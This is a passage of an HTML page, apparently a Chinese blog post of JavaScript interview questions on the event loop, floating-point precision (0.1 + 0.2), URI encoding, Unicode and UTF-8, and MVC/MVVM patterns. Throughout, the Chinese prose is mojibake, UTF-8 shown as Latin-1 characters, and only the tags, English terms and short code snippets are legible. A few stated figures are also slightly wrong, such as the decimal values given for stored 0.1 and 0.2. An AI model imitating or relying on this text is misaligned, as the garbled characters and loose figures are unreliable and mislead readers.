ä»£ç æ·»åŠ å…ƒç´ ã€å‚æ•°ã€å±æ€§æ—¶ååˆ†æœ‰ç”¨ã€‚å¦‚æœæƒ³è¦æ·»åŠ æ–°çš„å±æ€§ï¼Œå¹¶ä¸”ä¸Šä¸€è¡Œå·²ç»ä½¿ç”¨äº†å°¾åé€—å·ï¼Œä½ å¯ä»¥ä»…ä»…æ·»åŠ æ–°çš„ä¸€è¡Œï¼Œè€Œä¸éœ€è¦ä¿®æ”¹ä¸Šä¸€è¡Œã€‚è¿™ä½¿å¾—ç‰ˆæœ¬æ§åˆ¶æ›´åŠ æ¸…æ™°ï¼Œä»¥åŠä»£ç ç»´æŠ¤éº»çƒ¦æ›´å°‘ã€‚</p><p>å¦‚æœä½¿ç”¨äº†å¤šäºä¸€ä¸ªå°¾åé€—å·ï¼Œä¼šäº§ç”Ÿé—´éš™ã€‚ å¸¦æœ‰é—´éš™çš„æ•°ç»„å«åšç¨€ç–æ•°ç»„ï¼ˆå¯†è‡´æ•°ç»„æ²¡æœ‰é—´éš™ï¼‰ï¼Œé•¿åº¦ä¸º<strong>é€—å·çš„æ•°é‡</strong>ã€‚</p><h2 id="js-è¯­å¥æœ«å°¾åˆ†å·æ˜¯å¦å¯ä»¥çœç•¥ï¼Ÿ"><a href="#js-è¯­å¥æœ«å°¾åˆ†å·æ˜¯å¦å¯ä»¥çœç•¥ï¼Ÿ" class="headerlink" title="js è¯­å¥æœ«å°¾åˆ†å·æ˜¯å¦å¯ä»¥çœç•¥ï¼Ÿ"></a>js è¯­å¥æœ«å°¾åˆ†å·æ˜¯å¦å¯ä»¥çœç•¥ï¼Ÿ</h2><p>åœ¨ ECMAScript è§„èŒƒä¸­ï¼Œè¯­å¥ç»“å°¾çš„åˆ†å·å¹¶ä¸æ˜¯å¿…éœ€çš„ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸€èˆ¬æœ€å¥½ä¸è¦çœç•¥åˆ†å·ï¼Œå› ä¸ºåŠ ä¸Šåˆ†å·ä¸€æ–¹é¢æœ‰åˆ©äºæˆ‘ä»¬ä»£ç çš„å¯ç»´æŠ¤æ€§ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿå¯ä»¥é¿å…æˆ‘ä»¬åœ¨å¯¹ä»£ç è¿›è¡Œå‹ç¼©æ—¶å‡ºç°é”™è¯¯ã€‚</p><h2 id="å¦‚ä½•ç¼–å†™é«˜æ€§èƒ½çš„-Javascript-ï¼Ÿ"><a href="#å¦‚ä½•ç¼–å†™é«˜æ€§èƒ½çš„-Javascript-ï¼Ÿ" class="headerlink" title="å¦‚ä½•ç¼–å†™é«˜æ€§èƒ½çš„ Javascript ï¼Ÿ"></a>å¦‚ä½•ç¼–å†™é«˜æ€§èƒ½çš„ Javascript ï¼Ÿ</h2><ul><li>ä½¿ç”¨ä½è¿ç®—ä»£æ›¿ä¸€äº›ç®€å•çš„å››åˆ™è¿ç®—ã€‚</li><li>é¿å…ä½¿ç”¨è¿‡æ·±çš„åµŒå¥—å¾ªç¯ã€‚</li><li>ä¸è¦ä½¿ç”¨æœªå®šä¹‰çš„å˜é‡ã€‚</li><li>å½“éœ€è¦å¤šæ¬¡è®¿é—®æ•°ç»„é•¿åº¦æ—¶ï¼Œå¯ä»¥ç”¨å˜é‡ä¿å­˜èµ·æ¥ï¼Œé¿å…æ¯æ¬¡éƒ½ä¼šå»è¿›è¡Œå±æ€§æŸ¥æ‰¾ã€‚</li></ul><h2 id="escapeï¼ŒencodeURIï¼ŒencodeURIComponent-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#escapeï¼ŒencodeURIï¼ŒencodeURIComponent-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="*escapeï¼ŒencodeURIï¼ŒencodeURIComponent æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>*escapeï¼ŒencodeURIï¼ŒencodeURIComponent æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>encodeURI æ˜¯å¯¹æ•´ä¸ª URI è¿›è¡Œè½¬ä¹‰ï¼Œå°† URI ä¸­çš„éæ³•å­—ç¬¦è½¬æ¢ä¸ºåˆæ³•å­—ç¬¦ï¼Œæ‰€ä»¥å¯¹äºä¸€äº›åœ¨ URI ä¸­æœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦ä¸ä¼šè¿›è¡Œè½¬ä¹‰ã€‚</p><p>encodeURIComponent æ˜¯å¯¹ URI çš„ç»„æˆéƒ¨åˆ†è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä¹Ÿä¼šå¾—åˆ°è½¬ä¹‰ã€‚</p><p>escape å’Œ encodeURI çš„ä½œç”¨ç›¸åŒï¼Œä¸è¿‡å®ƒä»¬å¯¹äº unicode ç¼–ç ä¸º 0xff ä¹‹å¤–å­—ç¬¦çš„æ—¶å€™ä¼šæœ‰åŒºåˆ«ï¼Œescape æ˜¯ç›´æ¥åœ¨å­—ç¬¦çš„ unicode ç¼–ç å‰åŠ ä¸Š %uï¼Œè€Œ encodeURI é¦–å…ˆä¼šå°†å­—ç¬¦è½¬æ¢ä¸º UTF-8 çš„æ ¼å¼ï¼Œå†åœ¨æ¯ä¸ªå­—èŠ‚å‰åŠ ä¸Š %ã€‚</p><h2 id="Unicode-å’Œ-UTF-8-ä¹‹é—´çš„å…³ç³»ï¼Ÿ"><a href="#Unicode-å’Œ-UTF-8-ä¹‹é—´çš„å…³ç³»ï¼Ÿ" class="headerlink" title="Unicode å’Œ UTF-8 ä¹‹é—´çš„å…³ç³»ï¼Ÿ"></a>Unicode å’Œ UTF-8 ä¹‹é—´çš„å…³ç³»ï¼Ÿ</h2><p>Unicode æ˜¯ä¸€ç§å­—ç¬¦é›†åˆï¼Œç°åœ¨å¯å®¹çº³ 100 å¤šä¸‡ä¸ªå­—ç¬¦ã€‚æ¯ä¸ªå­—ç¬¦å¯¹åº”ä¸€ä¸ªä¸åŒçš„ Unicode ç¼–ç ï¼Œå®ƒåªè§„å®šäº†ç¬¦å·çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå´æ²¡æœ‰è§„å®šè¿™ä¸ªäºŒè¿›åˆ¶ä»£ç åœ¨è®¡ç®—æœºä¸­å¦‚ä½•ç¼–ç ä¼ è¾“ã€‚</p><p>UTF-8 æ˜¯ä¸€ç§å¯¹ Unicode çš„ç¼–ç æ–¹å¼ï¼Œå®ƒæ˜¯ä¸€ç§å˜é•¿çš„ç¼–ç æ–¹å¼ï¼Œå¯ä»¥ç”¨ 1~4 ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯æ‰§è¡Œæ ˆï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ‰§è¡Œæ ˆï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ‰§è¡Œæ ˆï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ‰§è¡Œæ ˆï¼Ÿ</h2><p>å¯ä»¥æŠŠæ‰§è¡Œæ ˆè®¤ä¸ºæ˜¯ä¸€ä¸ªå­˜å‚¨å‡½æ•°è°ƒç”¨çš„<strong>æ ˆç»“æ„</strong>ï¼Œéµå¾ªå…ˆè¿›åå‡ºçš„åŸåˆ™ã€‚å½“å¼€å§‹æ‰§è¡Œ JS ä»£ç æ—¶ï¼Œé¦–å…ˆä¼šæ‰§è¡Œä¸€ä¸ª <code>main</code> å‡½æ•°ï¼Œç„¶åæ‰§è¡Œä»£ç ã€‚æ ¹æ®å…ˆè¿›åå‡ºçš„åŸåˆ™ï¼Œåæ‰§è¡Œçš„å‡½æ•°ä¼šå…ˆå¼¹å‡ºæ ˆã€‚</p><h2 id="js-çš„äº‹ä»¶å¾ªç¯ï¼ˆEvent-Loopï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#js-çš„äº‹ä»¶å¾ªç¯ï¼ˆEvent-Loopï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="js çš„äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ"></a>js çš„äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>ä¸åŒçš„ä»»åŠ¡æºä¼šè¢«åˆ†é…åˆ°ä¸åŒçš„ Task é˜Ÿåˆ—ä¸­ï¼Œä»»åŠ¡æºå¯ä»¥åˆ†ä¸º <strong>å¾®ä»»åŠ¡</strong>ï¼ˆmicrotaskï¼‰ å’Œ <strong>å®ä»»åŠ¡</strong>ï¼ˆmacrotaskï¼‰ã€‚åœ¨ ES6 è§„èŒƒä¸­ï¼Œmicrotask ç§°ä¸º <code>jobs</code>ï¼Œmacrotask ç§°ä¸º <code>task</code>ã€‚æœ‰å…³å®ä»»åŠ¡ã€å¾®ä»»åŠ¡å…·ä½“è§<a href="https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/">tasks-microtasks-queues-and-schedules</a>ã€‚</p><p> js æ˜¯å•çº¿ç¨‹è¿è¡Œçš„ï¼Œé€šè¿‡å°†ä¸åŒå‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡å‹å…¥æ‰§è¡Œæ ˆæ¥ä¿è¯ä»£ç çš„æœ‰åºæ‰§è¡Œã€‚åœ¨æ‰§è¡ŒåŒæ­¥ä»£ç çš„æ—¶å€™ï¼Œå¦‚æœé‡åˆ°äº†<strong>å¼‚æ­¥</strong>äº‹ä»¶ï¼Œjs å¼•æ“å¹¶ä¸ä¼šä¸€ç›´ç­‰å¾…å…¶è¿”å›ç»“æœï¼Œè€Œæ˜¯å°†è¿™ä¸ªäº‹ä»¶æŒ‚èµ·ï¼Œç»§ç»­æ‰§è¡Œæ‰§è¡Œæ ˆä¸­çš„å…¶ä»–ä»»åŠ¡ï¼›å½“å¼‚æ­¥äº‹ä»¶æ‰§è¡Œå®Œæ¯•åï¼Œå†<strong>å°†å¼‚æ­¥äº‹ä»¶å¯¹åº”çš„å›è°ƒåŠ å…¥åˆ°ä¸å½“å‰æ‰§è¡Œæ ˆä¸­ä¸åŒçš„å¦ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ä¸­</strong>ç­‰å¾…æ‰§è¡Œã€‚</p><p>ä»»åŠ¡é˜Ÿåˆ—å¯ä»¥åˆ†ä¸ºå®ä»»åŠ¡é˜Ÿåˆ—å’Œå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œå½“å‰æ‰§è¡Œæ ˆä¸­çš„äº‹ä»¶æ‰§è¡Œå®Œæ¯•åï¼Œjs å¼•æ“é¦–å…ˆä¼šåˆ¤æ–­å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ä»»åŠ¡å¯ä»¥æ‰§è¡Œï¼Œå¦‚æœæœ‰å°±å°†å¾®ä»»åŠ¡é˜Ÿé¦–çš„äº‹ä»¶å‹å…¥æ ˆä¸­æ‰§è¡Œã€‚å½“å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡éƒ½æ‰§è¡Œå®Œæˆåå†åˆ¤æ–­å®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ã€‚</p><p><strong>å¾®ä»»åŠ¡</strong>ï¼š <code>process.nextTick</code> ï¼Œ<code>promise</code> çš„å›è°ƒï¼Œå¯¹ Dom å˜åŒ–ç›‘å¬çš„<code>MutationObserver</code>ï¼Œå…¶ä¸­ <code>process.nextTick</code> ä¸º Node ç‹¬æœ‰ã€‚</p><p><strong>å®ä»»åŠ¡</strong>ï¼š <code>script</code> è„šæœ¬çš„æ‰§è¡Œã€<code>setTimeout </code>ï¼Œ<code>setInterval</code> ï¼Œ<code>setImmediate</code> ä¸€ç±»çš„å®šæ—¶äº‹ä»¶ï¼Œè¿˜æœ‰å¦‚ <code>I/O</code> æ“ä½œã€<code>UI rendering</code>ç­‰ã€‚</p><p><img src="https://i.loli.net/2021/09/11/H3nSo9t6erYCmMA.png" alt="image.png"></p><p>Event Loop æ‰§è¡Œé¡ºåºå¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>é¦–å…ˆæ‰§è¡ŒåŒæ­¥ä»£ç ï¼Œè¿™å±äºå®ä»»åŠ¡</li><li>å½“æ‰§è¡Œå®Œæ‰€æœ‰åŒæ­¥ä»£ç åï¼Œæ‰§è¡Œæ ˆä¸ºç©ºï¼ŒæŸ¥è¯¢æ˜¯å¦æœ‰å¼‚æ­¥ä»£ç éœ€è¦æ‰§è¡Œ</li><li>æ‰§è¡Œæ‰€æœ‰å¾®ä»»åŠ¡</li><li>å½“æ‰§è¡Œå®Œæ‰€æœ‰å¾®ä»»åŠ¡åï¼Œå¦‚æœ‰å¿…è¦ä¼šæ¸²æŸ“é¡µé¢</li><li>ç„¶åå¼€å§‹ä¸‹ä¸€è½® Event Loopï¼Œæ‰§è¡Œå®ä»»åŠ¡ä¸­çš„å¼‚æ­¥ä»£ç ï¼Œä¹Ÿå°±æ˜¯ <code>setTimeout</code> ä¸­çš„å›è°ƒå‡½æ•°</li></ul><h2 id="Node-ä¸­çš„-Event-Loop-å’Œæµè§ˆå™¨ä¸­çš„æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#Node-ä¸­çš„-Event-Loop-å’Œæµè§ˆå™¨ä¸­çš„æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="Node ä¸­çš„ Event Loop å’Œæµè§ˆå™¨ä¸­çš„æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>Node ä¸­çš„ Event Loop å’Œæµè§ˆå™¨ä¸­çš„æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p><a href="https://juejin.cn/post/6844903512845860872#heading-4">è¿™ä¸€æ¬¡ï¼Œå½»åº•å¼„æ‡‚ JavaScript æ‰§è¡Œæœºåˆ¶</a></p><p>Node çš„ Event Loop åˆ†ä¸º 6 ä¸ªé˜¶æ®µï¼Œå®ƒä»¬ä¼šæŒ‰ç…§<strong>é¡ºåº</strong>åå¤è¿è¡Œã€‚æ¯å½“è¿›å…¥æŸä¸€ä¸ªé˜¶æ®µçš„æ—¶å€™ï¼Œéƒ½ä¼šä»å¯¹åº”çš„å›è°ƒé˜Ÿåˆ—ä¸­å–å‡ºå‡½æ•°å»æ‰§è¡Œã€‚å½“é˜Ÿåˆ—ä¸ºç©ºæˆ–è€…æ‰§è¡Œçš„å›è°ƒå‡½æ•°æ•°é‡åˆ°è¾¾ç³»ç»Ÿè®¾å®šçš„é˜ˆå€¼ï¼Œå°±ä¼šè¿›å…¥ä¸‹ä¸€é˜¶æ®µã€‚</p><p><img src="https://i.loli.net/2021/09/11/cyIsZ8k7fXYT2eD.png" alt="image.png"></p><ul><li>timers é˜¶æ®µä¼šæ‰§è¡Œ <code>setTimeout</code> å’Œ <code>setInterval</code> å›è°ƒï¼Œå¹¶ä¸”æ˜¯ç”± poll é˜¶æ®µæ§åˆ¶çš„ã€‚åŒæ ·ï¼Œåœ¨ Node ä¸­å®šæ—¶å™¨æŒ‡å®šçš„æ—¶é—´ä¹Ÿä¸æ˜¯å‡†ç¡®æ—¶é—´ï¼Œåªèƒ½æ˜¯<strong>å°½å¿«</strong>æ‰§è¡Œã€‚</li><li>I/O é˜¶æ®µä¼šå¤„ç†ä¸€äº›ä¸Šä¸€è½®å¾ªç¯ä¸­çš„<strong>å°‘æ•°æœªæ‰§è¡Œ</strong>çš„ I/O å›è°ƒ</li><li>poll æ˜¯ä¸€ä¸ªè‡³å…³é‡è¦çš„é˜¶æ®µï¼Œè¿™ä¸€é˜¶æ®µä¸­ï¼Œç³»ç»Ÿä¼šåšä¸¤ä»¶äº‹æƒ…<ul><li>å›åˆ° timer é˜¶æ®µæ‰§è¡Œå›è°ƒ</li><li>æ‰§è¡Œ I/O å›è°ƒ</li></ul></li><li>check é˜¶æ®µæ‰§è¡Œ <code>setImmediate</code></li><li>close callbacks é˜¶æ®µæ‰§è¡Œ close äº‹ä»¶</li></ul><h2 id="process-nextTick-æ‰§è¡Œé¡ºåºï¼Ÿ"><a href="#process-nextTick-æ‰§è¡Œé¡ºåºï¼Ÿ" class="headerlink" title="process.nextTick æ‰§è¡Œé¡ºåºï¼Ÿ"></a>process.nextTick æ‰§è¡Œé¡ºåºï¼Ÿ</h2><p>è¿™ä¸ªå‡½æ•°å…¶å®æ˜¯ç‹¬ç«‹äº Event Loop ä¹‹å¤–çš„ï¼Œå®ƒæœ‰ä¸€ä¸ªè‡ªå·±çš„é˜Ÿåˆ—ï¼Œå½“æ¯ä¸ªé˜¶æ®µå®Œæˆåï¼Œå¦‚æœå­˜åœ¨ nextTick é˜Ÿåˆ—ï¼Œå°±ä¼š<strong>æ¸…ç©ºé˜Ÿåˆ—ä¸­çš„æ‰€æœ‰å›è°ƒå‡½æ•°</strong>ï¼Œå¹¶ä¸”ä¼˜å…ˆäºå…¶ä»– microtask æ‰§è¡Œã€‚</p><h2 id="ä¸ºä»€ä¹ˆ-0-1-0-2-0-3ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆ-0-1-0-2-0-3ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆ 0.1 + 0.2 != 0.3ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ"></a>ä¸ºä»€ä¹ˆ 0.1 + 0.2 != 0.3ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ</h2><ul><li><p>è®¡ç®—æœºå®é™…ä¸Šè®¡ç®—çš„æ˜¯è¿™ä¸¤ä¸ªæ•°å­—åœ¨è®¡ç®—æœºé‡Œæ‰€å­˜å‚¨çš„äºŒè¿›åˆ¶ï¼Œ0.1 å’Œ 0.2 åœ¨è½¬æ¢ä¸ºäºŒè¿›åˆ¶è¡¨ç¤ºçš„æ—¶å€™ä¼šå‡ºç°ä½æ•°æ— é™å¾ªç¯çš„æƒ…å†µã€‚0.1 åœ¨äºŒè¿›åˆ¶ä¸­è¡¨ç¤ºä¸ºï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (0011) è¡¨ç¤ºå¾ªç¯</span></span><br><span class="line"><span class="number">0.1</span> = <span class="number">2</span>^-<span class="number">4</span> * <span class="number">1.10011</span>(<span class="number">0011</span>)</span><br></pre></td></tr></table></figure></li><li><p>JS é‡‡ç”¨çš„æµ®ç‚¹æ•°æ ‡å‡†ä¼šè£å‰ªæ‰æˆ‘ä»¬çš„æ•°å­—ï¼šjs ä¸­æ˜¯ä»¥ 64 ä½åŒç²¾åº¦æ ¼å¼æ¥å­˜å‚¨æ•°å­—çš„ï¼Œåªæœ‰ 53 ä½çš„æœ‰æ•ˆæ•°å­—ï¼Œè¶…è¿‡è¿™ä¸ªé•¿åº¦çš„ä½æ•°ä¼šè¢«æˆªå–æ‰ã€‚IEEE 754 åŒç²¾åº¦ç‰ˆæœ¬ï¼ˆ64ä½ï¼‰å°† 64 ä½åˆ†ä¸ºäº†ä¸‰æ®µ</p><ul><li>ç¬¬ä¸€ä½ç”¨æ¥è¡¨ç¤ºç¬¦å·</li><li>æ¥ä¸‹å»çš„ 11 ä½ç”¨æ¥è¡¨ç¤ºæŒ‡æ•°</li><li>å…¶ä»–çš„ä½æ•°ç”¨æ¥è¡¨ç¤ºæœ‰æ•ˆä½ï¼Œä¹Ÿå°±æ˜¯ç”¨äºŒè¿›åˆ¶è¡¨ç¤º 0.1 ä¸­çš„ <code>10011(0011)</code></li></ul></li><li><p>é‚£ä¹ˆè¿™äº›å¾ªç¯çš„æ•°å­—è¢«è£å‰ªäº†ï¼Œå°±ä¼šå‡ºç°ç²¾åº¦ä¸¢å¤±çš„é—®é¢˜ï¼Œä¹Ÿå°±é€ æˆäº† 0.1 ä¸å†æ˜¯ 0.1 äº†ï¼Œè€Œæ˜¯å˜æˆäº† <code>0.100000000000000002</code>ï¼ŒåŒæ ·çš„ï¼Œ0.2 åœ¨äºŒè¿›åˆ¶ä¹Ÿæ˜¯æ— é™å¾ªç¯çš„ï¼Œè¢«è£å‰ªåä¹Ÿå¤±å»äº†ç²¾åº¦å˜æˆäº† <code>0.200000000000000002</code>ã€‚</p></li><li><p>æ‰€ä»¥è¿™ä¸¤è€…ç›¸åŠ ä¸ç­‰äº <code>0.3</code> è€Œæ˜¯ <code>0.300000000000000004</code></p></li></ul><p>å¯¹äºè¿™æ ·çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥</p><ul><li>å°†å…¶è½¬æ¢ä¸ºæ•´æ•°åå†è¿›è¡Œè¿ç®—ï¼Œè¿ç®—åå†è½¬æ¢ä¸ºå¯¹åº”çš„å°æ•°ï¼Œä»è€Œè§£å†³è¿™ä¸ªé—®é¢˜ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>((<span class="number">0.1</span> + <span class="number">0.2</span>).toFixed(<span class="number">10</span>)) === <span class="number">0.3</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li>å°†ä¸¤ä¸ªæ•°ç›¸åŠ çš„ç»“æœå’Œå³è¾¹ç›¸å‡ï¼Œå¦‚æœç›¸å‡çš„ç»“æœå°äºä¸€ä¸ªæå°æ•°ï¼ˆJavaScript æä¾›çš„æœ€å°ç²¾åº¦å€¼ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®¤å®šç»“æœæ˜¯ç›¸ç­‰çš„ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( <span class="built_in">Math</span>.abs(<span class="number">0.1</span> + <span class="number">0.2</span> - <span class="number">0.3</span>) &lt;= <span class="built_in">Number</span>.EPSILON);</span><br></pre></td></tr></table></figure><h2 id="toPrecision-å’Œ-toFixed-å’Œ-Math-round-çš„åŒºåˆ«ï¼Ÿ"><a href="#toPrecision-å’Œ-toFixed-å’Œ-Math-round-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="toPrecision å’Œ toFixed å’Œ Math.round çš„åŒºåˆ«ï¼Ÿ"></a>toPrecision å’Œ toFixed å’Œ Math.round çš„åŒºåˆ«ï¼Ÿ</h2><p>toPrecision ç”¨äºå¤„ç†ç²¾åº¦ï¼Œç²¾åº¦æ˜¯ä»å·¦è‡³å³ç¬¬ä¸€ä¸ªä¸ä¸º 0 çš„æ•°å¼€å§‹æ•°èµ·ã€‚<br>toFixed æ˜¯å¯¹å°æ•°ç‚¹åæŒ‡å®šä½æ•°å–æ•´ï¼Œä»å°æ•°ç‚¹å¼€å§‹æ•°èµ·ã€‚<br>Math.round æ˜¯å°†ä¸€ä¸ªæ•°å­—å››èˆäº”å…¥åˆ°ä¸€ä¸ªæ•´æ•°ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯-MVVMï¼Ÿæ¯”ä¹‹-MVC-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä»€ä¹ˆåˆæ˜¯-MVP-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-MVVMï¼Ÿæ¯”ä¹‹-MVC-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä»€ä¹ˆåˆæ˜¯-MVP-ï¼Ÿ" class="headerlink" title="*ä»€ä¹ˆæ˜¯ MVVMï¼Ÿæ¯”ä¹‹ MVC æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä»€ä¹ˆåˆæ˜¯ MVP ï¼Ÿ"></a>*ä»€ä¹ˆæ˜¯ MVVMï¼Ÿæ¯”ä¹‹ MVC æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä»€ä¹ˆåˆæ˜¯ MVP ï¼Ÿ</h2><p>MVCã€MVP å’Œ MVVM æ˜¯ä¸‰ç§å¸¸è§çš„è½¯ä»¶æ¶æ„è®¾è®¡æ¨¡å¼ï¼Œä¸»è¦é€šè¿‡åˆ†ç¦»å…³æ³¨ç‚¹çš„æ–¹å¼æ¥ç»„ç»‡ä»£ç ç»“æ„ï¼Œä¼˜åŒ–æˆ‘ä»¬çš„å¼€å‘æ•ˆç‡ã€‚</p><p>æ¯”å¦‚è¯´æˆ‘ä»¬å®éªŒå®¤åœ¨ä»¥å‰é¡¹ç›®å¼€å‘çš„æ—¶å€™ï¼Œä½¿ç”¨å•é¡µåº”ç”¨æ—¶ï¼Œå¾€å¾€ä¸€ä¸ªè·¯ç”±é¡µé¢å¯¹åº”äº†ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œæ‰€æœ‰çš„é¡µé¢é€»è¾‘éƒ½åœ¨ä¸€ä¸ªè„šæœ¬æ–‡ä»¶é‡Œã€‚é¡µé¢çš„æ¸²æŸ“ã€æ•°æ®çš„è·å–ï¼Œå¯¹ç”¨æˆ·äº‹ä»¶çš„å“åº”æ‰€æœ‰çš„åº”ç”¨é€»è¾‘éƒ½æ··åˆåœ¨ä¸€èµ·ï¼Œè¿™æ ·åœ¨å¼€å‘ç®€å•é¡¹ç›®æ—¶ï¼Œå¯èƒ½çœ‹ä¸å‡ºä»€ä¹ˆé—®é¢˜ï¼Œå½“æ—¶ä¸€æ—¦é¡¹ç›®å˜å¾—å¤æ‚ï¼Œé‚£ä¹ˆæ•´ä¸ªæ–‡ä»¶å°±ä¼šå˜å¾—å†—é•¿ï¼Œæ··ä¹±ï¼Œè¿™æ ·å¯¹æˆ‘ä»¬çš„é¡¹ç›®å¼€å‘å’ŒåæœŸçš„é¡¹ç›®ç»´æŠ¤æ˜¯éå¸¸ä¸åˆ©çš„ã€‚</p><p>MVC é€šè¿‡åˆ†ç¦» Modelã€View å’Œ Controller çš„æ–¹å¼æ¥ç»„ç»‡ä»£ç ç»“æ„ã€‚å…¶ä¸­ View è´Ÿè´£é¡µé¢çš„æ˜¾ç¤ºé€»è¾‘ï¼ŒModel è´Ÿè´£å­˜å‚¨é¡µé¢çš„ä¸šåŠ¡æ•°æ®ï¼Œä»¥åŠå¯¹ç›¸åº”æ•°æ®çš„æ“ä½œã€‚å¹¶ä¸” View å’Œ Model åº”ç”¨äº†è§‚å¯Ÿè€…æ¨¡å¼ï¼Œå½“ Model å±‚å‘ç”Ÿæ”¹å˜çš„æ—¶å€™å®ƒä¼šé€šçŸ¥æœ‰å…³ View å±‚æ›´æ–°é¡µé¢ã€‚Controller å±‚æ˜¯ View å±‚å’Œ Model å±‚çš„çº½å¸¦ï¼Œå®ƒä¸»è¦è´Ÿè´£ç”¨æˆ·ä¸åº”ç”¨çš„å“åº”æ“ä½œï¼Œå½“ç”¨æˆ·ä¸é¡µé¢äº§ç”Ÿäº¤äº’çš„æ—¶å€™ï¼ŒController ä¸­çš„äº‹ä»¶è§¦å‘å™¨å°±å¼€å§‹å·¥ä½œäº†ï¼Œé€šè¿‡è°ƒç”¨ Model å±‚æ¥å®Œæˆå¯¹ Model çš„ä¿®æ”¹ï¼Œç„¶å Model å±‚å†å»é€šçŸ¥ View å±‚æ›´æ–°ã€‚</p><p>MVP æ¨¡å¼ä¸ MVC å”¯ä¸€ä¸åŒçš„åœ¨äº Presenter å’Œ Controllerã€‚åœ¨ MVC æ¨¡å¼ä¸­æˆ‘ä»¬ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼ï¼Œæ¥å®ç°å½“ Model å±‚æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œé€šçŸ¥ View å±‚çš„æ›´æ–°ã€‚è¿™æ · View å±‚å’Œ Model å±‚è€¦åˆåœ¨ä¸€èµ·ï¼Œå½“é¡¹ç›®é€»è¾‘å˜å¾—å¤æ‚çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šé€ æˆä»£ç çš„æ··ä¹±ï¼Œå¹¶ä¸”å¯èƒ½ä¼šå¯¹ä»£ç çš„å¤ç”¨æ€§é€ æˆä¸€äº›é—®é¢˜ã€‚MVP çš„æ¨¡å¼é€šè¿‡ä½¿ç”¨ Presenter æ¥å®ç°å¯¹ View å±‚å’Œ Model å±‚çš„è§£è€¦ã€‚MVC ä¸­çš„Controller åªçŸ¥é“ Model çš„æ¥å£ï¼Œå› æ­¤å®ƒæ²¡æœ‰åŠæ³•æ§åˆ¶ View å±‚çš„æ›´æ–°ï¼ŒMVP æ¨¡å¼ä¸­ï¼ŒView å±‚çš„æ¥å£æš´éœ²ç»™äº† Presenter å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ Presenter ä¸­å°† Model çš„å˜åŒ–å’Œ View çš„å˜åŒ–ç»‘å®šåœ¨ä¸€èµ·ï¼Œä»¥æ­¤æ¥å®ç° View å’Œ Model çš„åŒæ­¥æ›´æ–°ã€‚è¿™æ ·å°±å®ç°äº†å¯¹ View å’Œ Model çš„è§£è€¦ï¼ŒPresenter è¿˜åŒ…å«äº†å…¶ä»–çš„å“åº”é€»è¾‘ã€‚</p><p>MVVM æ¨¡å¼ä¸­çš„ VMï¼ŒæŒ‡çš„æ˜¯ ViewModelï¼Œå®ƒå’Œ MVP çš„æ€æƒ³å…¶å®æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡å®ƒé€šè¿‡åŒå‘çš„æ•°æ®ç»‘å®šï¼Œå°† View å’Œ Model çš„åŒæ­¥æ›´æ–°ç»™è‡ªåŠ¨åŒ–äº†ã€‚å½“ Model 